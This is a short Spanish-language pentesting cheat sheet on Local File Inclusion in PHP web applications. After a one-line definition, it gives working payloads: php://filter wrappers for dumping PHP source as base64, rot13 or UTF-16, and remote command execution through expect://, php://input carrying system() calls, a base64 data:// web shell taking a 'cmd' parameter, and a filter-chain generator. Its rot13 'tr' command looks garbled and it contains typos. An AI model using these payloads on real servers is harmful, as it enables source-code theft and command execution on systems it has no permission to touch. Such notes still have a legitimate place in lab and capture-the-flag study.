#LFI #OWASP #Explotacion 
#### Definición
>**Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.


### Ver contenido
Para ver el contenido completo de un archivo .php sin que sea interpretado podemos usar un *wrapper* que nos lo concatene en base64 y nosotros desde nuestra maquina local poderlo ver.
`php://filter/convert.base64-encode/resource="nombre_recurso.php"`

Para decodearlo:
`echo -n "codigo_base66" | base64 -d; echo`

También podemos rotar los caracteres 13 posiciones y luego desrotarlo:
`php://filter/read=string.rot13/resource="nombre_recurso.php"`

Para desrotarlo:
Primero lo guardamos en un archivo con `nano`
Luego usamos el siguiente comando:
`cat "nombre_archivo" | tr '[c-za-bC-ZA-B]' '[p-za-o-P-ZA-O]'`
También podemos usar la web llamada rot13.

También lo podemos ver sin tener que interpretarlo usaremos:
`php://filter/convert.iconv.utf-8.utf-16/resource="nombre_recurso.php"`


### Ejecutar comandos
Para poder ejecutar comando en la maquina RCE:
Interceptaremos con burp en la maquina la petición, en el `GET` modificaremos justo después del `=` de esta petición.
`expect://whoami`

Para el siguiente habría que modificar la petición de `GET` a `POST` 
`php://input`
En la parte de abajo de la petición podemos pasarle datos en forma de código `php`:
`<?php  system("whoami"); ?>`

En el siguiente se le pueden pasar cadenas en base64:
Interceptaremos con burb en la maquina la petición, en el `GET` modificaremos justo después del `=` de esta petición.
`data://text/plain;base64,codigo_base64=`
Para que la gestión de comando sea mas cómoda podremos usar el siguiente código php y transformarlo a base64:
`<?php system($_GET['cmd']); ?>`
Pegas la nueva cadena con el código base64 nuevo:
`data://text/plain;base64,codigo_base64%2b&cmd=whoami`


También se pude hacer uso de cadena de filtros podemos usar la herramienta `php_filter_chain_generator.py` con la opción `--chain 'Codigo_php'`
Tendremos que copiar la cadena completa he introducirla después del `=` en la petición.
